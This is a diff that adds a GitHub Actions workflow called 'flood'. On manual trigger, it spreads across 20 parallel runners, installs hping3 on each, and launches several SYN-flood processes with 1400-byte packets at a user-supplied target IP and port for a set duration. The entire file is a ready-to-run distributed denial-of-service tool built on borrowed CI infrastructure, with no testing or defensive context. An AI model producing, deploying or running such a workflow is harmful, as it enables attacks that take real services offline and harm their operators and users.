@@ -1,0 +1,32 @@
+name: flood
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target IP'
+        required: true
+      port:
+        description: 'port'
+        default: '80'
+      seconds:
+        description: 'duration'
+        default: '60'
+      workers:
+        description: 'hping3 instances per runner'
+        default: '4'
+jobs:
+  fire:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - name: go
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq hping3
+          for i in $(seq 1 ${{ inputs.workers }}); do
+            sudo hping3 --flood -S -p ${{ inputs.port }} -d 1400 ${{ inputs.target }} &
+          done
+          sleep ${{ inputs.seconds }}
+          sudo pkill -INT hping3
